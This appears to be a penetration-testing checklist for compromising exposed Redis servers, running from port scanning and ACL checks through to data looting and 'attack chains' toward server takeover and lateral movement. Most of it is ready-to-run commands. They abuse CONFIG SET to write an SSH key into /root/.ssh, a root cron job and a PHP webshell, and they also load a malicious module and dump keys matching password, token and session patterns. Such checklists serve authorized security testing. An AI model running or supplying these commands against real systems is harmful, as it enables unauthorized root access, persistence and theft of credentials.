## 1. Discovery & Access
- [ ] Scan ports 6379/26379  
  ```bash
  nmap -p 6379,26379 <target>
  ```
- [ ] Banner grab  
  ```bash
  nc <target> 6379
  ```
  → send `PING` → reply `+PONG`?
- [ ] Check basic info  
  ```bash
  redis-cli -h <target> INFO server
  ```

---

## 2. Authentication & ACL
- [ ] Test known credentials  
  ```bash
  redis-cli -h <target> -a <PASS>
  ```
- [ ] Check user and permissions  
  ```bash
  redis-cli ACL WHOAMI
  redis-cli ACL LIST
  redis-cli ACL CAT @all
  ```
- [ ] Verify if current user has `+@write` or `+@dangerous`

---

## 3. Basic Write Test
- [ ] Test write operation  
  ```bash
  redis-cli SET testkey "owned"
  redis-cli GET testkey
  ```

---

## 4. Recon Information
- [ ] Full info  
  ```bash
  redis-cli INFO all
  ```
- [ ] Directory and filename  
  ```bash
  redis-cli CONFIG GET dir
  redis-cli CONFIG GET dbfilename
  ```
- [ ] Modules and available commands  
  ```bash
  redis-cli MODULE LIST
  redis-cli COMMAND
  ```

---

## 5. File Write Exploits

### 5.1 SSH authorized_keys
```bash
redis-cli SET crackit "ssh-rsa AAAAB3N..."
redis-cli CONFIG SET dir /root/.ssh/
redis-cli CONFIG SET dbfilename "authorized_keys"
redis-cli SAVE
```

### 5.2 Cronjob
```bash
redis-cli SET job "* * * * * root /bin/bash -c 'id > /tmp/owned'"
redis-cli CONFIG SET dir /etc/cron.d/
redis-cli CONFIG SET dbfilename "redis"
redis-cli SAVE
```

### 5.3 Webshell
```bash
redis-cli SET shell "<?php system($_GET['c']); ?>"
redis-cli CONFIG SET dir /var/www/html
redis-cli CONFIG SET dbfilename "x.php"
redis-cli SAVE
```

---

## 6. Replication / Module
- [ ] If `REPLICAOF` allowed → start rogue server and force replication
- [ ] Load malicious `.so` payload  
  ```bash
  redis-cli MODULE LOAD /tmp/evil.so
  ```
- [ ] Use exposed commands (e.g., `system.exec`)

---

## 7. Lua / CVE
- [ ] If `EVAL` allowed → test Lua script execution
- [ ] On Debian/Ubuntu → check **CVE-2022-0543** (RCE via Lua sandbox escape)

---

## 8. Cluster / Sentinel
- [ ] If port 26379 open  
  ```bash
  redis-cli SENTINEL masters
  redis-cli SENTINEL get-master-addr-by-name <name>
  ```
- [ ] If cluster active  
  ```bash
  redis-cli CLUSTER NODES
  redis-cli CLUSTER INFO
  ```

---

## 9. Data Looting
- [ ] Search sensitive keys with `SCAN` (never use `KEYS *`)  
  ```bash
  redis-cli SCAN 0 MATCH "*pass*" COUNT 100
  redis-cli SCAN 0 MATCH "*user*" COUNT 100
  redis-cli SCAN 0 MATCH "*token*" COUNT 100
  redis-cli SCAN 0 MATCH "*session*" COUNT 100
  ```
- [ ] Dump values  
  ```bash
  redis-cli GET <key>
  redis-cli HGETALL <key>
  redis-cli LRANGE <key> 0 -1
  redis-cli SMEMBERS <key>
  redis-cli ZRANGE <key> 0 -1 WITHSCORES
  ```

---

## 10. Reporting & Chaining
- [ ] Is Redis exposed? (public vs internal)
- [ ] Authentication required? ACL config secure?
- [ ] `@dangerous` commands accessible?
- [ ] File-write successful?
- [ ] Code execution achieved?
- [ ] Sensitive data exfiltrated?
- [ ] Possible attack chains → Redis → credentials → server takeover → lateral movement
